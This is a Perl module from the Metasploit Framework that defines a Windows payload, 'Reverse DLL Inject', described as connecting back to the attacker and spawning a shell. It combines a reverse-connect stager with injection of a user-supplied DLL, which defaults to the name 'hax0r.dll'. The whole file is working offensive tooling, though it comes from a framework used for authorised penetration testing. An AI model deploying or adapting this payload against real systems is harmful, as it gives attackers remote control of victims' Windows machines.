
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_reverse_dllinject;
use strict;
use base 'Msf::PayloadComponent::Win32InjectLibStage';
sub _Load {
  Msf::PayloadComponent::Win32InjectLibStage->_Import('Msf::PayloadComponent::Win32ReverseStager');
  __PACKAGE__->SUPER::_Load();
}

my $info =
{
  'Name'         => 'Windows Reverse DLL Inject',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [
                        'Matt Miller <mmiller [at] hick.org>',
                        'Jarkko Turkulainen <jt [at] klake.org>',
                    ],
  'UserOpts'     =>
 	{ 
		'DLL'     => [1, 'PATH', 'The full path to the DLL that should be injected'],
		'DLLNAME' => [0, 'PATH', 'The name of the DLL as it will appear in the module list'] 
	},
               
};

sub new {
  _Load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub _InjectDLL {
  my $self = shift;
  return $self->GetVar('DLL');
}

sub _InjectDLLName {
  my $self = shift;
  my $name =  $self->GetVar('DLLNAME');

  $name = "hax0r.dll" if (not defined($name));

  return $name;
}

1;
